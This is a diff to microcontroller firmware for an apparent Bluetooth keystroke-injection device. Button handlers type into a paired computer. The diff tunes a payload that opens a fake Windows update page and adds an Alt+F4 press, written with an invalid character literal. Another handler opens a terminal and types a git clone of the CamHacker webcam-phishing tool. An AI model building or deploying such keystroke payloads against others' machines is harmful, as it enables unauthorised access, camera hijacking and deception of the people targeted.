@@ -128,8 +128,10 @@ void loop() {
     if (lastState3 == HIGH && state3 == LOW) {
       Serial.println("Button 3: Fake Update Screen (Pin 18)");
       openRun();
-      sendString("https://fakeupdate.net/win10ue/", 10); delay(100);
+      sendString("https://fakeupdate.net/win10ue/", 50); delay(100);
       bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.press(KEY_LEFT_ALT); 
+      bleKeyboard.press('F4'); 
       bleKeyboard.releaseAll(); delay(1000);
       Serial.println("Fake Update Screen Payload executed");
     }
@@ -140,7 +142,7 @@ void loop() {
       bleKeyboard.press(KEY_LEFT_CTRL); 
       bleKeyboard.press(KEY_LEFT_ALT); 
       bleKeyboard.press('t'); 
-      delay(3000); 
+      delay(100); 
       bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
       Serial.println("Terminal opened");
       sendString("git clone https://github.com/KasRoudra/CamHacker", 50); delay(1000); // 50ms per char, 1000ms before RETURN
@@ -349,6 +351,7 @@ void loop() {
   }
   delay(50); // Debounce/stability
 }
+
 
 
 
